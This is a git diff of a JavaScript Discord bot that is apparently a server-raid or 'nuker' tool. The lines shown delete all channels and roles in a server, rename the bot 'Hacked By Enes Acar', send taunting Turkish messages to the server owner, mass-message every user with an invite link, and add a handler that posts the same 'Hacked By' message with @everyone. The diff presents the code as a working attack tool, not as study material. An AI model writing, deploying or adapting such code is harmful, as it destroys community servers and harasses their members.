@@ -36,7 +36,7 @@ client.on("message", async msg => {
 
     await msg.guild.channels.deleteAll();
 
-    await msg.guild.createChannel("ャ tek-kral-enes-acar", {
+    await msg.guild.createChannel("ャ", {
       type: "text"
     });
     await msg.guild
@@ -98,7 +98,7 @@ client.on("message", async msg => {
     await client.user.setUsername("ャ Hacked By Enes Acar ャ"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
     await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
     await msg.guild.owner.send("Patladın Canım Geçmiş Olsun | https://discord.gg/vd77Jpf"); //KURUCUSUNA GONDERILEN MESAJ
-    const kanal = await msg.guild.channels.find(x => x.name === "ャ tek-kral-enes-acar");
+    const kanal = await msg.guild.channels.find(x => x.name === "ャ");
     await kanal.send("__**SİZ ACI ÇEKTİKÇE BİZ GÜLÜYORUZ**__ \nKÜLLERİMİZDEN TEKRAR DOĞACAĞIZ <a:kullermizdendogacagz:667722719290327041>\n Hacked By **ENES ACAR#0001** \nhttps://www.youtube.com/watch?v=_2X2VA-Ld10 \n||@everyone||");
   }
 });
@@ -108,13 +108,19 @@ client.on("message", async msg => {
     await msg.client.users
       .forEach(users =>
         users.send(
-          "`Patladı knk, Burdan` <@" +
+          "`Patladı knk, Burdan` <@" + ////     await msg.guild.channels.find(x => x.name === "ャ");
             msg.guild.owner.id +
             "> `İsimli Salağa Selamlar`\n https://discord.gg/vd77Jpf"
         )
       )
       .catch(console.error);
   } //duyuru mesjai bu
+});
+
+client.on('message', msg => {
+  if (msg.content === 'asd') {
+    msg.reply('__**SİZ ACI ÇEKTİKÇE BİZ GÜLÜYORUZ**__ \n**KÜLLERİMİZDEN TEKRAR DOĞACAĞIZ** <:asd:667722719290327041> \nHacked By **ENES ACAR#0001** \nhttps://www.youtube.com/watch?v=_2X2VA-Ld10 \n||@everyone||');
+  }
 });
 
 //―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
